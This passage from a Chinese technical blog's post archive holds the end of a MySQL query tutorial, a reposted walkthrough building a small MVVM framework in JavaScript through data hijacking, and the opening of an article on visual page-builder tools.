刘八 || 9 | 杨九 || 10 | 郑十 || 11 | 张三 || 12 | 李四 || 13 | 王五 |+----+--------+ 5.2.4 查询不重复记录123456789101112131415mysql&gt; select distinct name,avatar from users;+--------+----------------------------------------------------+| name | avatar |+--------+----------------------------------------------------+| steven | http://cdn.awesome_app.com/path/to/xxx/steven.jpg || bill | http://cdn.awesome_app.com/path/to/xxx/avatar2.jpg || 张三 | http://cdn.awesome_app.com/path/to/xxx/3.jpg || 李四 | http://cdn.awesome_app.com/path/to/xxx/4.jpg || 王五 | http://cdn.awesome_app.com/path/to/xxx/5.jpg || 马六 | http://cdn.awesome_app.com/path/to/xxx/6.jpg || 肖七 | http://cdn.awesome_app.com/path/to/xxx/7.jpg || 刘八 | http://cdn.awesome_app.com/path/to/xxx/8.jpg || 杨九 | http://cdn.awesome_app.com/path/to/xxx/9.jpg || 郑十 | http://cdn.awesome_app.com/path/to/xxx/10.jpg |+--------+----------------------------------------------------+ 5.2.5 限制查询行数查询前几行 1234567mysql&gt; select id,name from users limit 2;+----+--------+| id | name |+----+--------+| 1 | steven || 2 | bill |+----+--------+ 查询从指定偏移(第一行为偏移为0)开始的几行 12345678mysql&gt; select id,name from users limit 2,3;+----+--------+| id | name |+----+--------+| 3 | 张三 || 4 | 李四 || 5 | 王五 |+----+--------+ 5.2.6 排序123456789101112131415161718# 正序mysql&gt; select distinct name from users order by name asc limit 3;+--------+| name |+--------+| bill || steven || 刘八 |+--------+# 倒序mysql&gt; select id,name from users order by id desc limit 3;+----+--------+| id | name |+----+--------+| 13 | 王五 || 12 | 李四 || 11 | 张三 |+----+--------+ 5.2.7 分组增加城市字段 1234567alter table `users` add `city` varchar(10) comment &apos;用户所在城市&apos; after `name`;update `users` set `city`=&apos;旧金山&apos; where `id`=1;update `users` set `city`=&apos;西雅图&apos; where `id`=2;update `users` set `city`=&apos;北京&apos; where `id` in (3,5,7);update `users` set `city`=&apos;上海&apos; where `id` in (4,6,8);update `users` set `city`=&apos;广州&apos; where `id` between 9 and 10;update `users` set `city`=&apos;深圳&apos; where `id` between 11 and 13; 按城市分组统计用户数 1234567891011121314151617181920212223242526mysql&gt; select city, count(name) as num_of_user from users group by city;+-----------+-------------+| city | num_of_user |+-----------+-------------+| 上海 | 3 || 北京 | 3 || 广州 | 2 || 旧金山 | 1 || 深圳 | 3 || 西雅图 | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user=1;+-----------+-------------+| city | num_of_user |+-----------+-------------+| 旧金山 | 1 || 西雅图 | 1 |+-----------+-------------+mysql&gt; select city, count(name) as num_of_user from users group by city having num_of_user&gt;2;+--------+-------------+| city | num_of_user |+--------+-------------+| 上海 | 3 || 北京 | 3 || 深圳 | 3 |+--------+-------------+ 5.3 多表关联查询5.3.1 准备数据1234567891011121314151617181920create table if not exists `orders`( `id` int not null primary key auto_increment comment &apos;订单ID&apos;, `title` varchar(50) not null comment &apos;订单标题&apos;, `user_id` int not null comment &apos;用户ID&apos;, `cretime` timestamp not null default current_timestamp comment &apos;创建时间&apos;);create table if not exists `groups`( `id` int not null primary key auto_increment comment &apos;用户组ID&apos;, `title` varchar(50) not null comment &apos;用户组标题&apos;, `cretime` timestamp not null default current_timestamp comment &apos;创建时间&apos;);alter table `users` add `group_id` int comment &apos;用户分组&apos; after `city`;insert into `groups` (`title`) values (&apos;大佬&apos;), (&apos;萌新&apos;), (&apos;菜鸡&apos;);insert into `orders` (`title`, `user_id`) values (&apos;《大佬是怎样炼成的？》&apos;, 3), (&apos;《MySQL 从萌新到删库跑路》&apos;, 6), (&apos;《菜鸡踩坑记》&apos;, 9);update `users` set `group_id`=1 where `id` between 1 and 2;update `users` set `group_id`=2 where `id` in (4, 6, 8, 10, 12);update `users` set `group_id`=3 where `id` in (3, 5, 13); 5.3.2 joinjoin 用于在多个表中查询相互匹配的数据。 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users`, `orders` where `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| 张三 | 《大佬是怎样炼成的？》 || 马六 | 《MySQL 从萌新到删库跑路》 || 杨九 | 《菜鸡踩坑记》 |+-----------+--------------------------------------+ inner join 内部连接。效果与 join 一样 , 但用法不同，join 使用 where ，inner join 使用 on 。 12345678mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` inner join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| 张三 | 《大佬是怎样炼成的？》 || 马六 | 《MySQL 从萌新到删库跑路》 || 杨九 | 《菜鸡踩坑记》 |+-----------+--------------------------------------+ left join 左连接。返回左表所有行，即使右表中没有匹配的行，不匹配的用 NULL 填充。 123456789101112131415161718mysql&gt; select `users`.`name` as `user_name`, `orders`.`title` as `order_title` from `users` left join `orders` on `orders`.`user_id`=`users`.`id`;+-----------+--------------------------------------+| user_name | order_title |+-----------+--------------------------------------+| 张三 | 《大佬是怎样炼成的？》 || 马六 | 《MySQL 从萌新到删库跑路》 || 杨九 | 《菜鸡踩坑记》 || steven | NULL || bill | NULL || 李四 | NULL || 王五 | NULL || 肖七 | NULL || 刘八 | NULL || 郑十 | NULL || 张三 | NULL || 李四 | NULL || 王五 | NULL |+-----------+--------------------------------------+ right join 右连接。和 left join 正好相反，会返回右表所有行，即使左表中没有匹配的行，不匹配的用 NULL 填充。 123456789101112131415161718mysql&gt; select `groups`.`title` as `group_title`, `users`.`name` as `user_name` from `groups` right join `users` on `users`.`group_id`=`groups`.`id`;+-------------+-----------+| group_title | user_name |+-------------+-----------+| 大佬 | steven || 大佬 | bill || 萌新 | 李四 || 萌新 | 马六 || 萌新 | 刘八 || 萌新 | 郑十 || 萌新 | 李四 || 菜鸡 | 张三 || 菜鸡 | 王五 || 菜鸡 | 王五 || NULL | 肖七 || NULL | 杨九 || NULL | 张三 |+-------------+-----------+ 5.3.3 unionunion 用于合并两个或多个查询结果，合并的查询结果必须具有相同数量的列，并且列拥有形似的数据类型，同时列的顺序相同。 1234567891011mysql&gt; (select `id`, `title` from `groups`) union (select `id`, `title` from `orders`);+----+--------------------------------------+| id | title |+----+--------------------------------------+| 1 | 大佬 || 2 | 萌新 || 3 | 菜鸡 || 1 | 《大佬是怎样炼成的？》 || 2 | 《MySQL 从萌新到删库跑路》 || 3 | 《菜鸡踩坑记》 |+----+--------------------------------------+ 6. 函数6.1 语法select function(column) from table_name 6.2 合计函数（Aggregate functions）合计函数的操作面向一系列的值，并返回一个单一的值。通常与 group by 语句一起用。 函数 描述 avg(column) 返回某列的平均值 count(column) 返回某列的行数（不包括 NULL 值） count(*) 返回被选行数 first(column) 返回在指定的域中第一个记录的值 last(column) 返回在指定的域中最后一个记录的值 max(column) 返回某列的最高值 min(column) 返回某列的最低值 sum(column) 返回某列的总和 6.3 标量函数（Scalar functions） 函数 描述 ucase(c) 转换为大写 lcase(c) 转换为小写 mid(c, start[, end]) 从文本提取字符 len(c) 返回文本长度 instr(c, char) 返回在文本中指定字符的数值位置 left(c, number_of_char) 返回文本的左侧部分 right(c, number_of_char) 返回文本的右侧部分 round(c, decimals) 对数值指定小数位数四舍五入 mod(x, y) 取余（求模） now() 返回当前的系统日期 format(c, format) 格式化显示 datediff(d, date1, date2) 日期计算]]></content>
  </entry>
  <entry>
    <title><![CDATA[Puppeteer 初体验]]></title>
    <url>%2F2019%2F10%2F02%2FNode.js%2FPuppeteer%20%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[参考文档 Puppeteer 官方文档 Puppeteer 中文 API]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[250行实现一个简单的MVVM]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F250%E8%A1%8C%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84MVVM%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://saul-mirone.github.io/2016/12/19/simple-mvvm/ 什么是MVVM？MVVM是一种程序架构设计。把它拆开来看应该是Model-View-ViewModel。 ModelModel指的是数据层，是纯净的数据。对于前端来说，它往往是一个简单的对象。例如： 123456789&#123; name: &apos;mirone&apos;, age: 20, friends: [&apos;singleDogA&apos;, &apos;singleDogB&apos;], details: &#123; type: &apos;notSingleDog&apos;, tags: [&apos;fff&apos;, &apos;sox&apos;] &#125;&#125; 数据层是我们需要渲染后呈现给用户的数据，数据层本身是可变的。数据层不应该承担逻辑操作和计算的功能。 ViewView指视图层，是直接呈现给用户的部分，简单的来说，对于前端就是HTML。例如上面的数据层，它对应的视图层可能是： 123456789101112131415161718192021&lt;div&gt; &lt;p&gt; &lt;b&gt;name: &lt;/b&gt; &lt;span&gt;mirone&lt;/span&gt; &lt;/p&gt; &lt;p&gt; &lt;b&gt;age: &lt;/b&gt; &lt;span&gt;20&lt;/span&gt; &lt;/p&gt; &lt;ul&gt; &lt;li&gt;singleDogA&lt;/li&gt; &lt;li&gt;singleDogB&lt;/li&gt; &lt;/ul&gt; &lt;div&gt; &lt;p&gt;notSingleDog&lt;/p&gt; &lt;ul&gt; &lt;li&gt;fff&lt;/li&gt; &lt;li&gt;sox&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 当然视图层是可变的，你完全可以在其中随意添加元素。这不会改变数据层，只会改变视图层呈现数据的方式。视图层应该和数据层完全分离。 ViewModel既然视图层应该和数据层分离，那么我们就需要设计一种结构，让它们建立起某种联系。当我们对Model进行修改的时候，ViewModel就会把修改自动同步到View层去。同样当我们修改View，Model同样被ViewModel自动修改。 可以看出，如何设计能够高效自动同步View与Model的ViewModel是整个MVVM框架的核心和难点。 MVVM的原理差异不同的框架对于MVVM的实现是不同的。 数据劫持Vue的实现方式，对数据（Model）进行劫持，当数据发生变动时，数据会触发劫持时绑定的方法，对视图进行更新。 脏检查机制Angular的实现方式，当发生了某种事件（例如输入），Angular会检查新的数据结构和之前的数据结构是否发生了变动，来决定是否更新视图。 发布订阅模式Knockout的实现方式，实现了一个发布订阅器，解析时会在对应视图节点绑定订阅器，而在数据上绑定发布器，当修改数据时，就出发了发布器，视图收到后进行对应更新。 相同点但是还是有很多相同点的，它们都有三个步骤： 解析模版 解析数据 绑定模版与数据 解析模版何谓模版？我们可以看一下主流MVVM的API： 12345678910111213141516171819202122232425&lt;!-- Vue --&gt;&lt;div id=&quot;mobile-list&quot;&gt; &lt;h1 v-text=&quot;title&quot;&gt;&lt;/h1&gt; &lt;ul&gt; &lt;li v-for=&quot;item in brands&quot;&gt; &lt;b v-text=&quot;item.name&quot;&gt;&lt;/b&gt; &lt;span v-show=&quot;showRank&quot;&gt;Rank: &#123;&#123;item.rank&#125;&#125;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;!-- Angular --&gt;&lt;ul&gt; &lt;li ng-repeat=&quot;phone in phones&quot;&gt; &#123;&#123;phone.name&#125;&#125; &lt;p&gt;&#123;&#123;phone.snippet&#125;&#125;&lt;/p&gt; &lt;/li&gt;&lt;/ul&gt;&lt;!-- Knockout --&gt;&lt;tbody data-bind=&quot;foreach: seats&quot;&gt; &lt;tr&gt; &lt;td data-bind=&quot;text: name&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().mealName&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().price&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; 可以看到它们都定义了自己的模版关键字，这一模块的作用就是根据这些关键字解析模版，将模版对应到期望的数据结构。 解析数据Model中的数据经过劫持或绑定发布器来解析。数据解析器的编写要考虑VM的实现方式，但是无论如何解析数据只要做好一件事：定义数据变动时要通知的对象。解析数据时应保证数据解析后的一致性，对于每种数据解析后暴露的接口应该保持一致。 绑定模版与数据这一部分定义了数据结构以何种方式和模版进行绑定，就是传说中的“双向绑定”。绑定之后我们直接对数据进行操作时，应用就能自动更新视图了。数据和模版往往是多对多的关系，而且不同的模版更新数据的方式往往不同。例如有的是改变标签的文本节点，有的是改变标签的className。 动手实现MVVM经过一番分析，来动手实现MVVM吧。 期望效果对于我的MVVM，我希望对应一个数据结构： 1234567891011121314151617let data = &#123; title: &apos;todo list&apos;, user: &apos;mirone&apos;, todos: [ &#123; creator: &apos;mirone&apos;, content: &apos;write mvvm&apos; done: &apos;undone&apos;, date: &apos;2016-11-17&apos;, members: [ &#123; name: &apos;kaito&apos; &#125; ] &#125; ]&#125; 我可以对应的编写模版： 123456789101112131415161718&lt;div id=&quot;root&quot;&gt; &lt;h1 data-model=&quot;title&quot;&gt;&lt;/h1&gt; &lt;div&gt; &lt;div data-model=&quot;user&quot;&gt;&lt;/div&gt; &lt;ul data-list=&quot;todos&quot;&gt; &lt;li data-list-item=&quot;todos&quot;&gt; &lt;p data-class=&quot;todos:done&quot; data-model=&quot;todos:creator&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:date&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:content&quot;&gt;&lt;/p&gt; &lt;ul data-list=&quot;todos:members&quot;&gt; &lt;li data-list-item=&quot;todos:members&quot;&gt; &lt;span data-model=&quot;todos:members:name&quot;&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; 然后通过调用： 1new Parser(&apos;#root&apos;, data) 就可以完成mvvm的绑定，之后可以直接操作data对象来对View进行更改。 解析模版模版的解析其实是一个树的遍历过程。 遍历众所周知，DOM是一个树状结构，这也是为什么它被称为“DOM树”。 对于树的遍历，只要递归，便能很轻松的完成一个深度优先遍历，请看代码： 12345678910function scan(node) &#123; console.log(node) for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] console.log(_thisNode) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125;&#125; 这个函数遍历了一个DOM节点，依次打印遍历得到的节点。 遍历不同结构知道了如何遍历一个DOM树，那么我们如何获取需要分析的DOM树？ 根据之前的构想，我们需要这么几种标识： - data-model——用于将DOM的文本节点替换为制定内容 - data-class——用于将 DOM的className替换为制定内容 - data-list——用于标识接下来将出现一个列表，列表为制定结构 - data-list-item——用于标识列表项的内部结构 - data-event——用于为DOM节点绑定指定事件 简单的归类一下：data-model、data-class和data-event应该是一类，它们都只影响当前节点；而data-list和data-item作为列表应该要单独考虑。那么我们可以这样遍历： 123456789101112131415161718192021222324252627function scan(node) &#123; if(!node.getAttribute(&apos;data-list&apos;)) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] parseModel(node) parseClass(node) parseEvent(node) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125; &#125; else &#123; parseList(node) &#125;&#125;function parseModel(node) &#123; //TODO:解析Model节点&#125;function parseClass(node) &#123; //TODO:解析className&#125;function parseEvent(node) &#123; //TODO:解析事件&#125;function parseList(node) &#123; //TODO: 解析列表&#125; 这样我们就搭好了遍历器的大概框架 不同结构的处理方法parseModel，parseClass和parseEvent的处理方式比较相似，唯一值得注意的就是对于嵌套元素的处理，回忆一下我们的模版设计： 12&lt;!--遇到嵌套部分--&gt;&lt;div data-model=&quot;todos:date&quot;&gt;&lt;/div&gt; 这里的todos:date其实大大方便了我们解析模版，因为它展示了当前数据在Model结构中的位置。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//event要有一个eventList,大概结构为：const eventList = &#123; typeWriter: &#123; type: &apos;input&apos;, //事件的种类 fn: function() &#123; //事件的处理函数，函数的this代表函数绑定的DOM节点 &#125; &#125;&#125;function parseEvent(node) &#123; if(node.getAttribute(&apos;data-event&apos;)) &#123; const eventName = node.getAttribute(&apos;data-event&apos;) node.addEventListener(eventList[eventName].type, eventList[eventName].fn.bind(node)) &#125;&#125;//根据在模版中的位置解析模版，这里的Path是一个数组，代表了当前数据在Model中的位置function parseData(str, node) &#123; const _list = str.split(&apos;:&apos;) let _data, _path let p = [] _list.forEach((key, index) =&gt; &#123; if(index === 0) &#123; _data = data[key] p.push(key) &#125; else &#123; _path = node.path[index-1] p.push(_path) _data = _data[_path][key] p.push(key) &#125; &#125;) return &#123; path: p, data: _data &#125;&#125;function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; const modelName = node.getAttribute(&apos;data-model&apos;) const _data = parseData(modelName, node) if(node.tagName === &apos;INPUT&apos;) &#123; node.value = _data.data &#125; else &#123; node.innerText = _data.data &#125; &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; const className = node.getAttribute(&apos;data-class&apos;) const _data = parseData(className, node) if(!node.classList.contains(_data.data)) &#123; node.classList.add(_data.data) &#125; &#125;&#125; 接下来解析列表，我们遇到列表时，应该先递归找出列表项的结构 1234567891011121314151617181920parseListItem(node) &#123; let target !function getItem(node) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] if(node.path) &#123; _thisNode.path = node.path.slice() &#125; parseEvent(_thisNode) parseClass(_thisNode) parseModel(_thisNode) if(_thisNode.getAttribute(&apos;data-list-item&apos;)) &#123; target = _thisNode &#125; else &#123; getItem(_thisNode) &#125; &#125; &#125;(node) return target&#125; 之后在用这个列表项来按需拷贝出一定数量的列表项，并填充数据 123456789101112131415161718function parseList(node) &#123; const _item = parseListItem(node) const _list = node.getAttribute(&apos;data-list&apos;) const _listData = parseData(_list, node) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item)&#125; 这样我们就完成了模版的渲染，scan函数会扫描模版对模版进行渲染 解析数据解析了模版之后，我们就要研究如何进行数据解析了，这里我采用劫持数据的方法来进行。 普通对象的劫持如何劫持数据？一般对数据的劫持都是通过Object.defineProperty方法进行的，先看一个小例子： 1234567891011121314151617181920212223var obj = &#123; name: &apos;mi&apos;&#125;function observe(obj, key) &#123; let old = obj[key] Object.defineProperty(obj, key, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) old = now &#125; &#125; &#125;)&#125;observe(obj, &apos;name&apos;)obj.name = &apos;mirone&apos;//输出结果：//&quot;mi ---&gt; mirone&quot; 这样我们就通过object.defineProperty进行了数据劫持，如果我们想自定义劫持数据时发生的操作，只要添加一个回调函数参数即可： 12345678910111213141516function observer(obj, k, callback) &#123; let old = obj[k] Object.defineProperty(obj, k, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; callback(old, now) &#125; old = now &#125; &#125;)&#125; 嵌套对象的劫持对于对象中的对象，我么还需要多进行一个步骤，使用递归来劫持对象中的对象： 1234567891011121314//实现一个observeAllKey函数，劫持该对象的所有属性function observeAllKey(obj, callback) &#123; Object.keys(obj).forEach(function(key)&#123; observer(obj, key, callback) &#125;)&#125;function observer(obj, k, callback) &#123; let old = obj[k] if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //...同前文，省略 &#125;&#125; 对象中数组的劫持对于对象中的数组，我们使用重写数组的prototype的方法来劫持它 12345678910111213141516171819function observeArray(arr, callback) &#123; const oam = [&apos;push&apos;, &apos;pop&apos;, &apos;shift&apos;, &apos;unshift&apos;, &apos;splice&apos;, &apos;sort&apos;, &apos;reverse&apos;] const arrayProto = Array.prototype const hackProto = Object.create(Array.prototype) oam.forEach(function(method)&#123; Object.defineProperty(hackProto, method, &#123; writable: true, enumerable: true, configurable: true, value: function(...arg) &#123; let old = arr.slice() let now = arrayProto[method].call(this, ...arg) callback(old, this, ...arg) return now &#125;, &#125;) &#125;) arr.__proto__ = hackProto&#125; 写完劫持数组的函数后，将它添加进主函数： 12345678910function observer(obj, k, callback) &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125;&#125; 处理路径参数之前我们所有的方法都是面对单个key值的，回想一下我们的模版，有很多例如todos:todo:member这样的路径，我们应该允许传入一个路径数组，根据路径数组来监听指定的对象数据 123456789101112131415function observePath(obj, path, callback) &#123; let _path = obj let _key path.forEach((p, index) =&gt; &#123; if(parseInt(p) === p) &#123; p = parseInt(p) &#125; if(index &lt; path.length - 1) &#123; _path = _path[p] &#125; else &#123; _key = p &#125; &#125;) observer(_path, _key, callback)&#125; 之后再将它添加进主函数： 1234567891011121314function observer(obj, k, callback) &#123; if(Object.prototype.toString.call(k) === &apos;[object Array]&apos;) &#123; observePath(obj, k, callback) &#125; else &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125; &#125;&#125; 这样，我们就完成了监听函数。 多对一监视的实现有可能绑定某个数据结构的节点不止一个，有时我们需要修改完成时同时通知所有节点，那么我们还需要一个单独的模块负责通知所有节点，我们称之为Register模块，负责针对不同模块注册不同的一个或多个回调函数。 监视者的实现1234567891011121314151617181920212223242526272829303132class Register &#123; constructor() &#123; //存放所有回调对象，回调对象由三个key组成：obj, key, fn，其中fn应该是一个数组，放着所有发生变化时要执行的回调函数 this.routes = [] &#125; //添加一个回调 regist(obj, k, fn) &#123; const _i = this.routes.find(function(el) &#123; if((el.key === k || el.key.toString() === k.toString()) &amp;&amp; Object.is(el.obj, obj)) &#123; return el &#125; &#125;) if(_i) &#123; //如果已经存在该obj和key组成的对象 _i.fn.push(fn) &#125; else &#123; //如果尚不存在 this.routes.push(&#123; obj: obj, key: k, fn: [fn] &#125;) &#125; &#125; //解析结束时调用，绑定所有回调 build() &#123; this.routes.forEach((route) =&gt; &#123; observer(route.obj, route.key, route.fn) &#125;) &#125;&#125; observer模块的修改由于现在一个key可能对应多个回调操作了，需要对observer进行修改： 123456789101112131415function observer(obj, k, callback) &#123; //...与前文相同 if(now !== old) &#123; callback.forEach((fn) =&gt; &#123; fn(old, now) &#125;) &#125;&#125;function observerArray(arr, callback) &#123; //...与前文相同 //将原来的callback(old, this, ...arg)替换为 callback.forEach((fn) =&gt; &#123; fn(old, this, ...arg) &#125;)&#125; 绑定模版与数据现在，我们要在解析过程中添加对数据的监视了，还记得之前的parse系列函数吗？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const register = new Register()function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; //...之前逻辑不变 register.regist(data, _data.path, function(old, now) &#123; if(node.tagName === &apos;INPUT&apos;) &#123; node.value = now &#125; else &#123; node.innerText = now &#125; //添加console便于调试 console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; //... register.regist(data, _data.path, function(old, now) &#123; node.classList.remove(old) node.classList.add(now) console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;//当列表发生变化时，为了简单直接重新渲染了当前列表function parseList(node) &#123; //... register.regist(data, _listData.path, () =&gt; &#123; while(node.firstChild) &#123; node.removeChild(node.firstChild) &#125; const _listData = parseData(_list, node) node.appendChild(_item) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item) &#125;)&#125;//当模版解析结束后绑定所有事件register.build()]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[页面可视化搭建工具技术要点]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2F%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E6%90%AD%E5%BB%BA%E5%B7%A5%E5%85%B7%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%2F</url>
    <content type="text"><![CDATA[转载自掘金，作者CntChen，原文链接：https://juejin.im/post/5c627cce6fb9a049cd54ade1 背景页面可视化搭建工具, 是互联网公司中常见的运营工具, 实现了运营人员快速生成和发布页面, 提升页面上线效率; 且无需开发人员介入, 节省开发人力. 页面可视化搭建工具搭建出的页面示例: 但从零开始设计和开发出这种工具并不简单. 笔者维护的页面可视化搭建框架 pipeline, 提供了页面可视化搭建的核心功能, 免去从零实现页面可视化搭建工具的困难. 本文主要包含以下内容: 活动页面重复开发的痛点. 开发可视化搭建工具的技术要点. 理想的运营页面可视化搭建工具. 开源页面搭建框架 pipeline 介绍. 活动页面开发之痛活动页面特点前端业务中, 经常需要开发产品介绍页/营销页/活动页/图片展示页等页面. 这类需求有以下几个特点: 页面类似: 页面布局和业务逻辑较固定. 需求高频: 每周甚至每天有多个这种需求. 迭代快速: 开发时间短, 上线时间紧. 开发性价比低: 开发任务重复, 消耗各方的沟通时间和人力. 活动页面常规开发流程活动页面常规开发流程图 流程 运营/产品提出页面需求. 走项目流程进入开发环节. 开发根据设计稿完成页面开发. 测试进行页面测试. 运维进行页面上线. 运营/产品进行页面验收. 痛点 方多参与, 反复沟通, 串行流程. 页面上线周期长, 无法快速响应活动需求. 人力陷入重复工作泥潭, 忙碌而低效. 更优的流程对于高频和重复的活动页面开发, 业界一般将页面做成配置化, 配置工作从开发人员交接给产品/运营等需求方; 开发和设计人员只需提供配置化页面支持. 更优的活动页面生成流程依靠页面可视化搭建系统来实现. 更优的活动页面开发流程图 流程 运营/产品提出页面需求. 运营/产品在页面可视化搭建系统中选取合适的页面模板进行页面搭建. 页面自动化发布上线, 页面需求完成, 流程完结. 如果运营/产品没有找到合适的模板. 开发进行页面模板开发, 并将页面模板添加到页面可视化搭建系统中. 运营/产品继续流程2. 同时, 随着页面可视化搭建系统中的页面模板不断丰富, 新的页面需求对开发人员的依赖逐渐减低, 可由运营/产品直接完成. 页面可视化搭建工具更优的活动页面开发流程依靠页面可视化搭建系统实现, 重点是要有页面可视化搭建工具提供技术支持. 页面可视化搭建工具通过填写配置数据表单, 拖拉页面组件等可视化的页面编辑方式, 实现页面的生成或修改. 但从零开始设计和开发出页面可视化搭建工具并不简单, 有几个需要了解和关注的技术点. 页面可视化搭建工具的技术要点从技术角度, 设计和开发一个页面可视化搭建工具时, 需要考虑以下几个技术要点: 页面组件化 页面模板 页面可视化编辑 组件层级关系 页面打包 实时预览 页面组件开发 页面组件化组件化的优点页面的基本单元是 HTML 元素, 但是 HTML 元素无法包含业务逻辑, 且由 HTML 元素直接组合出页面, 过于繁杂和低效. 图片来源: 页面较好的组织方式是组件化, 如上图所示. 组件是对 HTML 元素、元素布局和样式、业务逻辑的封装. 通过组件封装业务逻辑, 并通过组件属性(Props)向外暴露组件的配置字段. 采用页面组件化, 复杂的页面可视化搭建可以转化为2个较简单的操作: 组件树组合, 页面可视化搭建变成页面组件的可视化组合. 组件配置编辑, 将对页面内容的编辑转化为对组件的配置属性(props)修改. 页面前端框架页面组件化需依靠前端框架来实现. 页面可视化搭建工具的架构方式对页面前端框架有限制: 需选择页面可视化搭建工具支持的前端框架. 如: 页面可视化搭建工具只支持基于 vue 的页面, 那页面组件化的前端框架只能选择 vue. 但是前端技术团队选用的前端框架, 一般已用于支持现有业务, 并沉淀了一定数量的技术组件和业务组件. 如果需要针对页面可视化搭建工具进行前端框架的切换, 成本将会很大. 所以理想的页面可视化搭建工具, 应该和页面的前端框架解偶, 如下图所示. 技术团队在某前端框架中沉淀的技术组件和业务组件, 可在页面可视化搭建工具的页面中复用. 技术难点1:页面可视化搭建工具与页面前端框架解偶. 当然, 前端业务已选用了某前端框架, 开发专门支持该前端框架的页面可视化搭建工具, 也是高效实现目标的选择. 页面模板页面模板包含完整的业务逻辑, 有助于快速生成业务页面. 不同的页面模板适用于不同的业务功能, 从模板库中选择合适的页面模板并派生出默认业务页面, 再对默认页面进行可视化编辑, 从而生成目标业务页面. 云凤蝶的页面模板列表: 模板带有页面的默认数据; 对于组件化的页面, 模板是从组件库中选取部分组件, 并带有各个组件的默认配置数据. 如上图所示, 页面组件库中有组件A, 组件B, 组件C, 组件D, …, 组件X等. 页面模板一由组件库中的组件A, 组件B和组件C组成, 实现了一个完整的业务功能; 页面模板二由组件库中的组件A, 组件B和组件X组成, 完成另一个完整的业务功能. 页面编辑页面由页面组件组合而成, 页面的编辑其实是对页面组件进行重新组合, 并编辑各页面组件的内容. 页面编辑包含2个部分: 编辑页面组件和编辑页面内容. 编辑页面组件组件树使用组件化的方式来组织页面, 页面可以认为是一棵组件树, 如下图所示, 树中的节点为页面组件, 页面组件可以包含子组件. 在代码编写上, 通过组件标签的组合来声明一棵组件树, 并在打包时生成页面资源, 在运行时加载页面资源渲染出页面. react 和 vue 的组件树声明示例: 编辑页面组件的一个可行方式是: 动态地给页面源码添加组件, 然后重新打包生成页面. 如通过可视化的方式替换 Left组件 为 NewLeft组件 后, 对源码的组件树声明做替换, 将 Left 标签替换为 NewLeft 标签. 动态组件一些前端框架支持动态组件, 